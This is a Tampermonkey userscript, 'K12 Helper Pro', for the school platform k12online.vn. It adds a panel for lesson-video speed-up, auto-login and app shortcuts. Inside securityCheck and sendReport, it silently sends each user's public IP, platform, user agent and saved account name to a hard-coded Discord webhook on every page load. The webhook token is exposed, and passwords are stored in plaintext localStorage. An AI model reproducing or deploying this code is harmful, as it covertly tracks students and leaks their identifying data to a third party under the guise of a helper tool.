// ==UserScript==
// @name         K12 Helper Pro - Danhvux Security System
// @namespace    http://tampermonkey.net/
// @version      20.0
// @description  Kết nối Bot Discord (Blacklist IP), giữ nguyên Video, Apps, Settings, Dark Mode.
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        GM_xmlhttpRequest
// @connect      api.ipify.org
// @connect      localhost
// ==/UserScript==

(function() {
    'use strict';

    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV';
    const BLACKLIST_API = 'http://localhost:5000/blacklist';

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00',
        width: 320,
        speed: 1,
        user: '',
        pass: '',
        isDarkMode: true
    };

    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // --- HÀM KIỂM TRA BẢO MẬT & KẾT NỐI BOT ---
    const securityCheck = async () => {
        try {
            // 1. Lấy IP người dùng
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const userIP = ipData.ip;

            // 2. Gửi Report Webhook (Chức năng cũ)
            sendReport(userIP);

            // 3. Kiểm tra Blacklist từ Bot Flask (Chức năng mới)
            const banRes = await fetch(BLACKLIST_API);
            const bannedIPs = await banRes.json();

            if (bannedIPs.includes(userIP)) {
                document.body.innerHTML = `
                    <div style="height:100vh; background:#000; color:red; display:flex; align-items:center; justify-content:center; font-family:sans-serif; flex-direction:column;">
                        <h1 style="font-size:50px;">🚫 ACCESS DENIED</h1>
                        <p style="font-size:20px; color:#fff;">IP của bạn (${userIP}) đã bị cấm bởi Danhvux System.</p>
                    </div>`;
                return false;
            }
            return true;
        } catch (e) {
            console.log("Security System Offline hoặc chưa bật Bot.");
            return true; // Nếu bot chưa bật thì vẫn cho dùng (hoặc sửa thành false nếu muốn bắt buộc bật bot)
        }
    };

    const sendReport = (ip) => {
        const msg = {
            "username": "Danhvux System Log",
            "embeds": [{
                "title": "🛡️ Hệ thống đã được kích hoạt",
                "color": parseInt(config.mainColor.replace('#', ''), 16),
                "fields": [
                    { "name": "🌐 Địa chỉ IP", "value": `\`${ip}\``, "inline": true },
                    { "name": "💻 Nền tảng", "value": `\`${navigator.platform}\``, "inline": true },
                    { "name": "👤 Tài khoản lưu sẵn", "value": config.user ? `\`${config.user}\`` : "_Chưa có_", "inline": false },
                    { "name": "🛠 Thiết bị", "value": "```" + navigator.userAgent + "```" }
                ],
                "footer": { "text": "Danhvux Panel • " + new Date().toLocaleString('vi-VN') }
            }]
        };
        fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(msg) });
    };

    // --- KHỞI TẠO GIAO DIỆN (CHỈ CHẠY NẾU KHÔNG BỊ BAN) ---
    securityCheck().then(isSafe => {
        if (!isSafe) return;

        const style = document.createElement('style');
        const updateCSS = () => {
            const isDark = config.isDarkMode;
            style.innerText = `
                :root { 
                    --mc: ${config.mainColor}; --w: ${config.width}px;
                    --bg: ${isDark ? '#1e2227' : '#ffffff'};
                    --bg-tab: ${isDark ? '#1a1d21' : '#f0f0f0'};
                    --bg-input: ${isDark ? '#252a31' : '#f9f9f9'};
                    --text: ${isDark ? '#ffffff' : '#1e2227'};
                    --text-sec: ${isDark ? '#777' : '#999'};
                    --border: ${isDark ? '#333' : '#ddd'};
                    --shadow: ${isDark ? 'rgba(0,0,0,0.6)' : 'rgba(0,0,0,0.1)'};
                }
                #dv-panel {
                    position: fixed; top: 50px; right: 20px; width: var(--w) !important;
                    background: var(--bg); color: var(--text); border-radius: 12px;
                    font-family: 'Segoe UI', sans-serif; z-index: 100000;
                    box-shadow: 0 10px 40px var(--shadow); overflow: hidden;
                    transition: height 0.4s ease; border: 1px solid var(--border);
                }
                .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; }
                .header .title { color: var(--mc); font-weight: bold; font-size: 18px; }
                .dots { display: flex; gap: 8px; }
                .dot { height: 12px; width: 12px; border-radius: 50%; cursor: pointer; }
                .red { background: #ff5f56; } .yellow { background: #ffbd2e; } .green { background: #27c93f; }
                .tabs { display: flex; background: var(--bg-tab); padding: 0 5px; border-bottom: 1px solid var(--border); justify-content: space-around; }
                .tab { padding: 12px 10px; cursor: pointer; font-size: 10px; color: var(--text-sec); font-weight: 900; position: relative; }
                .tab.active { color: var(--mc); }
                .tab.active::after { content: ''; position: absolute; bottom: 0; left: 10px; right: 10px; height: 3px; background: var(--mc); border-radius: 3px; }
                .content { display: none; padding: 20px; box-sizing: border-box; }
                .content.active { display: block; }
                .row-speed { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
                .val-right { color: var(--mc); font-weight: bold; font-size: 16px; }
                .slider { width: 100%; height: 5px; background: var(--border); border-radius: 5px; appearance: none; margin: 10px 0 25px 0; outline: none; }
                .slider::-webkit-slider-thumb { appearance: none; width: 16px; height: 16px; background: ${isDark ? '#fff' : 'var(--mc)'}; border-radius: 50%; cursor: pointer; }
                .video-placeholder { width: 100%; height: 110px; background: #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #444; font-size: 12px; margin-bottom: 15px; border: 1px dashed #333; }
                .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
                .app-item { background: var(--bg-input); padding: 12px 5px; border-radius: 10px; cursor: pointer; border: 1px solid var(--border); text-align: center; font-size: 10px; }
                input[type=text], input[type=password] { width: 100%; padding: 12px; background: var(--bg-input); border: 1px solid var(--border); color: var(--text); border-radius: 8px; margin-bottom: 12px; box-sizing: border-box; }
                .btn { width: 100%; padding: 14px; background: #b8cc8e; border: none; border-radius: 12px; color: #1e2227; font-weight: bold; cursor: pointer; }
                .btn-save { background: var(--mc) !important; color: #000; }
                .switch-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
                .switch { position: relative; display: inline-block; width: 40px; height: 20px; }
                .switch input { opacity: 0; width: 0; height: 0; }
                .slider-switch { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 20px; }
                .slider-switch:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
                input:checked + .slider-switch { background-color: var(--mc); }
                input:checked + .slider-switch:before { transform: translateX(20px); }
                .footer { text-align: center; font-size: 9px; color: var(--text-sec); padding: 10px; }
            `;
        };
        document.head.appendChild(style);
        updateCSS();

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header">
                <div class="title">Danhvux Panel</div>
                <div class="dots"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
            </div>
            <div class="tabs">
                <div class="tab active" data-t="t-main">MAIN</div>
                <div class="tab" data-t="t-video">VIDEO</div>
                <div class="tab" data-t="t-apps">APPS</div>
                <div class="tab" data-t="t-set">SETTINGS</div>
            </div>
            <div class="body-container">
                <div id="t-main" class="content active">
                    <div class="row-speed"><b>Tốc độ</b><span class="val-right">x<span id="sp-txt">${config.speed}</span></span></div>
                    <input type="range" id="sp-range" class="slider" min="1" max="16" step="0.5" value="${config.speed}">
                    <button class="btn" id="do-login">🪄 AUTO LOGIN</button>
                </div>
                <div id="t-video" class="content">
                    <div class="video-placeholder" id="v-display">video source</div>
                    <input type="text" id="v-url" placeholder="Link .mp4...">
                    <button class="btn" style="background:#444; color:#fff" id="v-run">PHÁT VIDEO</button>
                </div>
                <div id="t-apps" class="content">
                    <div class="app-grid">
                        <div class="app-item" onclick="window.open('https://gemini.google.com')">✨ Gemini</div>
                        <div class="app-item" onclick="window.open('https://chatgpt.com')">🤖 GPT</div>
                        <div class="app-item" onclick="window.open('https://messenger.com')">💬 Msg</div>
                        <div class="app-item" onclick="window.open('https://facebook.com')">📘 FB</div>
                        <div class="app-item" onclick="window.open('https://youtube.com')">🔴 YT</div>
                        <div class="app-item" onclick="window.open('https://tiktok.com')">🎵 TT</div>
                    </div>
                </div>
                <div id="t-set" class="content">
                    <div class="switch-row"><span>DARK MODE</span><label class="switch"><input type="checkbox" id="mode-toggle" ${config.isDarkMode ? 'checked' : ''}><span class="slider-switch"></span></label></div>
                    <input type="color" id="c-pick" style="width:100%;" value="${config.mainColor}">
                    <input type="range" id="w-range" class="slider" min="280" max="600" value="${config.width}">
                    <input type="text" id="u-val" placeholder="User..." value="${config.user}">
                    <input type="password" id="p-val" placeholder="Pass..." value="${config.pass}">
                    <button class="btn btn-save" id="btn-save">LƯU CÀI ĐẶT</button>
                </div>
            </div>
            <div class="footer">DANHVUX • K12 HELPER</div>
        `;
        document.body.appendChild(panel);

        // --- LOGIC HOẠT ĐỘNG ---
        const $ = (id) => panel.querySelector(id);
        const adjustHeight = () => {
            const active = panel.querySelector('.content.active');
            panel.style.height = (panel.querySelector('.header').offsetHeight + panel.querySelector('.tabs').offsetHeight + active.scrollHeight + 30) + 'px';
        };

        panel.querySelectorAll('.tab').forEach(tab => {
            tab.onclick = () => {
                panel.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                tab.classList.add('active');
                $(`#${tab.dataset.t}`).classList.add('active');
                adjustHeight();
            };
        });

        $('#mode-toggle').onchange = (e) => { config.isDarkMode = e.target.checked; updateCSS(); save(); };
        $('#sp-range').oninput = (e) => { $('#sp-txt').innerText = e.target.value; config.speed = e.target.value; document.querySelectorAll('video').forEach(v => v.playbackRate = config.speed); };
        $('#w-range').oninput = (e) => { config.width = e.target.value; panel.style.width = config.width + 'px'; };
        $('#btn-save').onclick = () => { config.mainColor = $('#c-pick').value; config.user = $('#u-val').value; config.pass = $('#p-val').value; save(); updateCSS(); alert('Đã lưu!'); };
        $('#v-run').onclick = () => { const v = document.querySelector('video'); if (v) { v.src = $('#v-url').value; v.play(); $('#v-display').innerText = "Đang phát..."; } };
        
        $('#do-login').onclick = () => {
            const u = document.querySelector('input[name="username"]'), p = document.querySelector('input[name="password"]');
            if(u && p) { u.value = config.user; p.value = config.pass; u.dispatchEvent(new Event('input',{bubbles:true})); p.dispatchEvent(new Event('input',{bubbles:true})); setTimeout(()=>document.querySelector('button[type="submit"]').click(), 500); }
        };

        let isDrag = false, off = [0,0];
        $('.header').onmousedown = (e) => { isDrag = true; off = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
        document.onmousemove = (e) => { if(isDrag) { panel.style.left = (e.clientX + off[0]) + 'px'; panel.style.top = (e.clientY + off[1]) + 'px'; panel.style.right = 'auto'; } };
        document.onmouseup = () => isDrag = false;
        $('.red').onclick = () => panel.style.display = 'none';
        document.addEventListener('keydown', (e) => { if(e.key === 'F2') panel.style.display = 'block'; });
        setTimeout(adjustHeight, 100);
    });
})();
